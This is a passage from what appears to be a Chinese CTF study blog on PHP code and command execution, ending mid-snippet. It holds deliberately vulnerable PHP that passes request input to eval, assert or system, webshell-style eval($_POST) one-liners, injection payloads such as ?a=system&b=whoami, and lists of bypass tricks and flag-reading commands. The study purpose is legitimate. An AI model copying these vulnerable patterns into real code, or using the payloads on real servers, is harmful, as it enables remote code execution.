title="call_user_func()"></a><code>call_user_func()</code></h3><p><code>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</code></p><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">call_user_func($_GET[&apos;museljh&apos;], $_GET[&apos;museljh&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在PHP7.0依旧可以<code>museljh=assert&amp;museljh=phpinfo()</code>,使用eval进行代码执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">call_user_func(function($a)&#123;eval($a);&#125;,$_GET[&apos;museljh&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a><code>call_user_func_array()</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func_array ( callable $callback , array $param_arr )</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">call_user_func_array($_GET[&apos;user&apos;],$_GET[&apos;pass&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>call_user_func_array(function($a){eval($a);},$_GET[&#39;museljh&#39;]);</code><br><code>http://127.0.0.1/1.php?museljh[]=echo 2;</code></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function  ===="></a><code>create_function</code>  ====</h3><p><code>string create_function ( string $args , string $code )</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;museljh&apos;];</span><br><span class="line">$b = create_function(&apos;$a&apos;,&quot;echo $a&quot;);</span><br><span class="line">$b(&apos;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>127.0.0.1/?museljh=phpinfo();</code></p><p>在ctf比赛中<code>create_function</code>常常可以用截断来进行利用,主要是由于这个函数里有内部有调用eval函数，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function sname($name)&#123;</span><br><span class="line">echo $name.&quot;xxx&quot;.$id;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$code = &apos;echo $name.&apos;.&apos;xxx&apos;.$id.&apos;; &apos;;</span><br><span class="line">$a = create_function(&apos;$name&apos;,$code);</span><br><span class="line">$a(&apos;pass&apos;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">echo 1;</span><br><span class="line">&#125;</span><br><span class="line">127.0.0.1/?id=;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a><code>array_filter()</code></h3><p><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</code></p><p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$array[0] = $_GET[&apos;a&apos;];</span><br><span class="line">array_filter($array,&apos;assert&apos;);</span><br></pre></td></tr></table></figure><p><code>127.0.0.1/?a=phpinfo()</code></p><h3 id="usort-uasort-uksort"><a href="#usort-uasort-uksort" class="headerlink" title="usort()/uasort()/uksort()"></a><code>usort()/uasort()/uksort()</code></h3><p><code>usort ( array &amp;$array , callable $value_compare_func ) : bool</code><br>usort — 使用用户自定义的比较函数对数组中的值进行排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//php5.6版本以下 </span><br><span class="line">   usort($_GET,&apos;system&apos;);    //xxx.php?1=1&amp;2=whoami</span><br><span class="line">   //usort($_GET,&apos;assert&apos;);   //xxx.php?1=1&amp;2=phpinfo()</span><br><span class="line">//php5.6以上</span><br><span class="line">   //usort(...$_GET);   xxx.php?1[]=1-1&amp;1[]=eval($_POST[&apos;x&apos;])&amp;2=assert</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//php5.6以上</span><br><span class="line">&lt;?php usort([&apos;$a=0&apos;,&apos;eval($_POST[&quot;x&quot;])&apos;],&apos;assert&apos;);?&gt;</span><br></pre></td></tr></table></figure><p>这里有个有趣的地方…运算符这是php5.6的新特性，在调用函数的时候，使用 … 运算符， 将 数组 和 可遍历 对象展开为函数参数。其实原理并没有发生什么变化，最终能够执行函数并非是usort而是eval。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function add($a, $b, $c) &#123;</span><br><span class="line">    return $a + $b + $c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$operators = [2, 3];</span><br><span class="line">echo add(1, ...$operators);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上述例子会输出6</p><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a><code>ob_start</code></h3><p><code>ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</code><br>ob_start — 打开输出控制缓冲</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = &apos;system&apos;;</span><br><span class="line">ob_start($cmd);</span><br><span class="line">echo &quot;$_GET[a]&quot;;</span><br><span class="line">ob_end_flush();</span><br><span class="line">//xxx.php?a=whoami</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>?a=whoami<br><code>ob_start</code>为打开输出缓冲，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中,如上例子也就是echo。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p><h3 id="可变函数-var-args"><a href="#可变函数-var-args" class="headerlink" title="可变函数$var(args)"></a><code>可变函数$var(args)</code></h3><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>?a=system&amp;b=whoami<br>?a=assert&amp;b=phpinfo()</p><h3 id=""><a href="#" class="headerlink" title="\$"></a><code>\$</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$&#123;phpinfo()&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map ===="></a><code>array_map</code> ====</h3><p><code>array array_map ( callable $callback , array $array1 [, array $... ] )</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;a&apos;];</span><br><span class="line">$b = $_GET[&apos;b&apos;];</span><br><span class="line">$array[0] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>?a=assert&amp;b=phpinfo();</p><p><code>$evil_callback</code>为回调函数，将<code>$some_array</code>作为参数传入回调函数进行执行</p><p>这里需要注意<code>$evil_callback</code>没有括号()和分号;</p><p>目前来说全版本都可以使用</p><h3 id="、array-walk-array-walk-recursive-register-shutdown-function-preg-replace-callback-array-reduce"><a href="#、array-walk-array-walk-recursive-register-shutdown-function-preg-replace-callback-array-reduce" class="headerlink" title="、array_walk/array_walk_recursive/register_shutdown_function/preg_replace_callback/array_reduce"></a>、<code>array_walk/array_walk_recursive/register_shutdown_function/preg_replace_callback/array_reduce</code></h3><p>1.<code>array_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] ) : bool</code></p><p><code>array_walk</code> — 使用用户自定义函数对数组中的每个元素做回调处理</p><p>2.<code>array_walk_recursive</code></p><p><code>array_walk_recursive</code> — 对数组中的每个成员递归地应用用户函数</p><p>3.<code>register_shutdown_function</code> </p><p><code>register_shutdown_function ( callable $callback [, mixed $parameter [, mixed $... ]] ) : void</code></p><p><code>register_shutdown_function</code> — 注册一个会在php中止时执行的函数</p><p>4.<code>preg_replace_callback</code></p><p><code>preg_replace_callback</code> — 执行一个正则表达式搜索并且使用一个回调进行替换</p><p><code>preg_replace_callback ( mixed $pattern , callable $callback , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code></p><p>5.<code>array_reduce</code></p><p>array_reduce — 用回调函数迭代地将数组简化为单一的值</p><p><code>array_reduce( array $array , callable $callback [, mixed $initial = NULL ] ) : mixed</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php array_walk($_GET[&apos;cmd&apos;],&apos;system&apos;);</span><br><span class="line">array_reduce($_GET[&apos;cmd&apos;],&apos;system&apos;);</span><br><span class="line">array_walk_recursive($_GET[&apos;cmd&apos;],&apos;system&apos;); </span><br><span class="line">register_shutdown_function(&apos;system&apos;,$_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">?cmd[]=whoami</span><br></pre></td></tr></table></figure><p>总的来说都是用回调函数，没什么新意。</p><h3 id="stream-filter-register"><a href="#stream-filter-register" class="headerlink" title="stream_filter_register"></a><code>stream_filter_register</code></h3><p><code>stream_filter_register ( string $filtername , string $classname ) : bool</code></p><p><code>stream_filter_register — Register a user defined stream filter</code></p><p>允许您在与所有其他文件系统函数一起使用的任何已注册流上实现自己的过滤器 (such as fopen(), fread() etc.).</p><p>这个函数有些厉害，具体要怎么利用我还没搞清楚，感觉这个函数可以让我们自己写个fopen之类的函数？</p><h3 id="array-uintersect-uassoc"><a href="#array-uintersect-uassoc" class="headerlink" title="array_uintersect_uassoc"></a><code>array_uintersect_uassoc</code></h3><p><code>array_uintersect_uassoc</code> </p><p>— 带索引检查计算数组的交集，用单独的回调函数比较数据和索引</p><p><code>array_uintersect_uassoc ( array $array1 , array $array2 [, array $... ], callable $value_compare_func , callable $key_compare_func ) : array</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a1=array($_POST[&apos;cmd&apos;]);</span><br><span class="line">$a2=array($_POST[&apos;cmd&apos;]);</span><br><span class="line">$result=array_uintersect_uassoc($a1,$a2,&quot;assert&quot;,&quot;assert&quot;);</span><br></pre></td></tr></table></figure><h3 id="xml-set-character-data-handler-xml-set-default-handler-xml-set-element-handler-xml-set-end-namespace-decl-handler-xml-set-external-entity-ref-handler-xml-set-notation-decl-handler-xml-set-processing-instruction-handler-xml-set-start-namespace-decl-handler-xml-set-unparsed-entity-decl-handler"><a href="#xml-set-character-data-handler-xml-set-default-handler-xml-set-element-handler-xml-set-end-namespace-decl-handler-xml-set-external-entity-ref-handler-xml-set-notation-decl-handler-xml-set-processing-instruction-handler-xml-set-start-namespace-decl-handler-xml-set-unparsed-entity-decl-handler" class="headerlink" title="xml_set_character_data_handler()/xml_set_default_handler()/xml_set_element_handler()/xml_set_end_namespace_decl_handler()/xml_set_external_entity_ref_handler()/xml_set_notation_decl_handler()/xml_set_processing_instruction_handler()/xml_set_start_namespace_decl_handler()/xml_set_unparsed_entity_decl_handler()/"></a><code>xml_set_character_data_handler()/xml_set_default_handler()/xml_set_element_handler()/xml_set_end_namespace_decl_handler()/xml_set_external_entity_ref_handler()/xml_set_notation_decl_handler()/xml_set_processing_instruction_handler()/xml_set_start_namespace_decl_handler()/xml_set_unparsed_entity_decl_handler()/</code></h3><p>如上xml解析同样面临回调问题</p><h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><p>以下大多数函数都是利用类似回调函数的方法进行利用就不详细探究了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">create_function(),call_user_func_array(),</span><br><span class="line">call_user_func(),assert(),</span><br><span class="line">preg_replace(),eval(),</span><br><span class="line">array_walk_recursive(),array_walk,array_map,ob_start(),</span><br><span class="line">array_filter(),</span><br><span class="line">preg_replace_callback()，register_shutdown_function()</span><br><span class="line">array_reduce()，stream_filter_register()</span><br><span class="line">array_diff_uassoc(), array_diff_ukey()</span><br><span class="line">array_udiff(), array_udiff_assoc(), array_udiff_uassoc()</span><br><span class="line">array_intersect_assoc(), array_intersect_uassoc()</span><br><span class="line">array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()</span><br><span class="line">xml_set_character_data_handler()</span><br><span class="line">xml_set_default_handler()</span><br><span class="line">xml_set_element_handler()</span><br><span class="line">xml_set_end_namespace_decl_handler()</span><br><span class="line">xml_set_external_entity_ref_handler()</span><br><span class="line">xml_set_notation_decl_handler()</span><br><span class="line">xml_set_processing_instruction_handler()</span><br><span class="line">xml_set_start_namespace_decl_handler()</span><br><span class="line">xml_set_unparsed_entity_decl_handler()</span><br><span class="line">stream_filter_register()</span><br><span class="line">set_error_handler()</span><br><span class="line">register_shutdown_function()</span><br><span class="line">register_tick_function()</span><br></pre></td></tr></table></figure><h2 id="二、PHP执行系统外部命令函数"><a href="#二、PHP执行系统外部命令函数" class="headerlink" title="二、PHP执行系统外部命令函数"></a>二、PHP执行系统外部命令函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a><code>system()</code></h3><p><code>system ( string $command [, int &amp;$return_var ] ) : string</code></p><p><code>php -r &quot;system(&#39;whoami&#39;);&quot;</code></p><p>输出结果</p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><code>passthru()</code></h3><p><code>pcntl_exec</code> — 在当前进程空间执行指定程序</p><p><code>pcntl_exec ( string $path [, array $args [, array $envs ]] ) : void</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">passthru(&quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>passthru直接将结果输出到浏览器,并且支持二进制文件，比如图片</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a><code>exec()</code></h3><p><code>exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string</code></p><p><code>php -r &quot;echo exec(&#39;whoami&#39;);&quot;</code></p><p>不输出结果，如果需要直接获取需要<code>$output</code>参数</p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()/``"></a><code>shell_exec()/``</code></h3><p><code>shell_exec — 通过 shell</code> 环境执行命令，并且将完整的输出以字符串的方式返回。效果与反引号一样，在安全模式下不起作用。</p><p><code>shell_exec ( string $cmd ) : string</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$output = shell_exec($_GET[&apos;a&apos;]);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>?a=whoami<br>不输出结果，如果需要echo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$output = shell_exec(&apos;ls file_not_exist 2&gt;&amp;1&apos;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p>将标准错误流输入到标准输出流里输出错误信息</p><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a><code>pcntl_exec()</code></h3><p>pcntl_exec — 在当前进程空间执行指定程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">pcntl_exec( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我本地ubuntu是没有这个函数的，但是我宝塔里却有，但是我宝塔执行不了这个函数，会报cannot execute binary file。</p><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><code>popen()</code></h3><p><code>popen</code> — 打开进程文件指针</p><p><code>popen ( string $command , string $mode ) : resource</code></p><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p><p>不能够直接  <code>php -r &#39;print_r(popen(&quot;/bin/ls&quot;, &quot;r&quot;));&#39;</code>，会返回Broken pipe,这个函数返回的是一个resource，我们可以通过fgets/fread函数去读取程序的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$test = &quot;whoami&quot;;  </span><br><span class="line">$fp = popen($test,&quot;r&quot;);  //popen打一个进程通道  </span><br><span class="line">  </span><br><span class="line">while (!feof($fp)) &#123;      //从通道取出内容 </span><br><span class="line">$out = fgets($fp, 4096);  </span><br><span class="line">echo  $out;          </span><br><span class="line">&#125;  </span><br><span class="line">pclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a><code>proc_open()</code></h3><p><code>proc_open</code> — 执行一个命令，并且打开用来输入/输出的文件指针。<br><code>proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] ) : resource</code></p><p><code>descriptorspec</code><br>一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">    0 =&gt; array(&apos;pipe&apos;, &apos;r&apos;),</span><br><span class="line">    1 =&gt; array(&apos;pipe&apos;, &apos;w&apos;), </span><br><span class="line">    2 =&gt; array(&apos;file&apos;, &apos;/dev/shm/error-output.txt&apos;, &apos;a&apos;)</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">$process = proc_open(&apos;ls -la&apos;, $descriptorspec, $pipes);</span><br><span class="line"> </span><br><span class="line">if (is_resource($process)) &#123;</span><br><span class="line"> </span><br><span class="line">    $output = stream_get_contents($pipes[1]);</span><br><span class="line"> </span><br><span class="line">    fclose($pipes[0]);</span><br><span class="line">    fclose($pipes[1]);</span><br><span class="line"> </span><br><span class="line">    // 调用proc_close前必须把所有管道先关闭，避免出现死锁</span><br><span class="line">    $retval = proc_close($process);</span><br><span class="line"> </span><br><span class="line">    echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">    echo &apos;&lt;br&gt;Return value: &apos; . $retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="escapeshellcmd-escapeshellarg-（属于命令执行绕过范畴）"><a href="#escapeshellcmd-escapeshellarg-（属于命令执行绕过范畴）" class="headerlink" title="escapeshellcmd()/escapeshellarg()（属于命令执行绕过范畴）"></a><code>escapeshellcmd()</code>/<code>escapeshellarg()</code>（属于命令执行绕过范畴）</h3><p>8.1、<code>escapeshellarg</code> — 把字符串转码为可以在 shell 命令里使用的参数</p><p>转义字符串$arg中的单引号并使用单引号包裹此部分</p><p>使得$arg只能传递一个参数，且不能执行不同的命令</p><p><code>escapeshellarg ( string $arg ) : string</code></p><p>8.2、<code>escapeshellcmd</code> — shell 元字符转义</p><p><code>escapeshellcmd ( string $command ) : string</code></p><p>转义<code>&amp; # ; | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ 、x0A和xF，&#39;和&quot;</code> 仅在落单时被转义</p><p>这些都会用^来取消其意义。也就是没办法用&amp; | 来执行其他命令，只能列目录。</p><p>以上两个函数都是为了保证命令在经过system以及其他命令执行函数时防止用户输入非法的命令，但是这两个函数并非是万能的，依旧有许多方式进行绕过。<br>1.<code>escapeshellcmd</code>与<code>escapeshellarg</code>同时存在时候可以利用其差异性进行绕过</p><h3 id="集合-1"><a href="#集合-1" class="headerlink" title="集合"></a>集合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,pope,passthru</span><br></pre></td></tr></table></figure><h3 id="windows下文件读取"><a href="#windows下文件读取" class="headerlink" title="windows下文件读取"></a>windows下文件读取</h3><p><code>1.more flag.txt</code></p><p><code>2.type flag.txt</code></p><h3 id="linux下文件读取"><a href="#linux下文件读取" class="headerlink" title="linux下文件读取"></a>linux下文件读取</h3><p><code>1.cat flag.txt /{cat,flag.txt}</code></p><p><code>2.more flag.txt</code></p><p><code>3.less flag.txt</code></p><p><code>4.head flag.txt</code></p><p><code>5.tail flag.txt</code></p><p><code>6.tac flag.txt</code></p><p><code>7.nl flag.txt</code></p><p><code>8.od flag.txt</code></p><p><code>9.fire flag.txt</code></p><p><code>10.wc flag.txt</code></p><p><code>11.uniq flag.txt</code></p><p><code>12.diff flag.txt flag1.txt</code></p><p><code>13.sed -n &#39;1,2p&#39; flag.txt</code></p><p><code>14.find -P flag.txt</code></p><p><code>15、strings flag.txt</code></p><p><code>16、tailf flag.txt</code></p><p><code>17、curl file:///root/flag.txt</code></p><p><code>18、sort flag.txt</code></p><p><code>19、{grep,-nrw,.}</code></p><p><code>20、grep -r ..</code></p><p><code>21、bash -v flag.txt</code></p><p><code>22、rev flag.txt</code></p><h3 id="windows-写文件"><a href="#windows-写文件" class="headerlink" title="windows 写文件"></a>windows 写文件</h3><h3 id="linux-写文件"><a href="#linux-写文件" class="headerlink" title="linux 写文件"></a>linux 写文件</h3><p><code>1.tee flag.txt</code></p><h2 id="三、命令执行绕过"><a href="#三、命令执行绕过" class="headerlink" title="三、命令执行绕过"></a>三、命令执行绕过</h2><h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%0a、%0d    换行符与回车符</span><br><span class="line">|           第一条命令结果作为第二条命令的输入</span><br><span class="line">||          第一条执行失败，执行第二条命令（</span><br><span class="line">;           连续指令功能。</span><br><span class="line">&amp;           连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          当第一条执行成功后执行后续命令</span><br></pre></td></tr></table></figure><h3 id="-1"><a href="#-1" class="headerlink" title="${}"></a><code>${}</code></h3><p>值得注意的是在被<code>“”</code>包裹时候直接<code>${}</code>是不可以的，因为PHP将会将它识别为可变变量而不是一个PHP代码。<br>这里有的有趣的发现，在下面已经将<code>phpinfo()</code>声明为可变变量后直接传入cmd=phpinfo()是可以执行的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&quot;cmd&quot;]))&#123;</span><br><span class="line">$cmd = @(string)$_GET[&quot;cmd&quot;];</span><br><span class="line">eval(&apos;$cmd=&quot;&apos; . addslashes($cmd) . &apos;&quot;;&apos;);</span><br><span class="line">echo &apos;$cmd=&quot;&apos; . addslashes($cmd) . &apos;&quot;;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">echo &apos;hello&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$a=$&#123;phpinfo()&#125;;</span><br></pre></td></tr></table></figure><p>当然对于<code>${}</code>来说会识别里面包含的第一个字符，只要将第一个字符修改为如<code>空格，tab，注释，回车</code>就会避免被直接当成变量，而会将其执行为PHP代码。</p><p>附上其他师傅总结payload</p><p>php &gt;= 4.3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;$&#123; phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;    phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;/**/phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;</span><br><span class="line">phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;@phpinfo()&#125;&quot;;</span><br><span class="line"></span><br><span class="line">&quot;$&#123;( string )phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;phpinfo[phpinfo()]&#125;&quot;;</span><br><span class="line"></span><br><span class="line">&quot;&#123;$phpinfo[phpinfo()]&#125;&quot;;</span><br><span class="line">&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br><span class="line">&quot;$&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure><p>php&gt;=5.5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;$&#123;phpinfo()&#125;&quot;;</span><br></pre></td></tr></table></figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>测试代码，该目录下还有一个flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;museljh&apos;]))&#123;</span><br><span class="line">  $muse=$_GET[&apos;museljh&apos;];</span><br><span class="line">  system($muse);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;no!no!no!&apos;;</span><br><span 